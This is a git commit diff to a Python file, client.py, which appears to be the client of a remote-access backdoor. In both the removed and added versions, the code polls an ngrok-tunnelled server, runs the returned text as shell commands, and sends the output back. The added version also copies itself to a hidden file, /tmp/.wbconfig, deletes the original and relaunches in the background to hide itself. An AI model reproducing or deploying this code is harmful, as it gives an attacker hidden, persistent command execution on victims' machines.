02b12858f2749fcc4b8cf7b3cbd94e76e0de3d7c
Gabriel H <gabrielhostalacioac1@gmail.com>
2017-05-19 20:40:04 -0300

    Update client.py

--- client.py
+++ client.py
@@ -1,11 +1,20 @@
-import requests, sys, subprocess, base64, time
-ngrok = sys.argv[1]
-while 1:
-	request = requests.get(ngrok)
-	if request.status_code == 200:
-		output = subprocess.Popen(base64.b64decode(request.text), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		requests.post(ngrok, data={'SPLITHERE': base64.b64encode(output.stdout.read()+output.stderr.read())})
-	elif request.status_code == 502:
-		time.sleep(5)
-	else:
-		sys.exit()
+import os,requests,sys,subprocess,time
+def run(ngrok):
+	while 1:
+		request = requests.get(ngrok)
+		if request.status_code == 200:
+			output = subprocess.Popen(request.text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			requests.post(ngrok, data={'SPLITHERE': str(output.stdout.read()+output.stderr.read())})
+		elif request.status_code == 502:
+			time.sleep(5)
+		else:
+			sys.exit()
+try:
+	if not sys.argv[1] == 'running':
+		os.system('rm '+sys.argv[0])
+		sys.exit(0)
+except:
+	os.system('cp '+sys.argv[0]+' /tmp/.wbconfig 2>/dev/null;rm '+sys.argv[0]+' 2>/dev/null;python /tmp/.wbconfig running & 2>/dev/null')
+	sys.exit(0)
+
+run('LINK_GERADO')
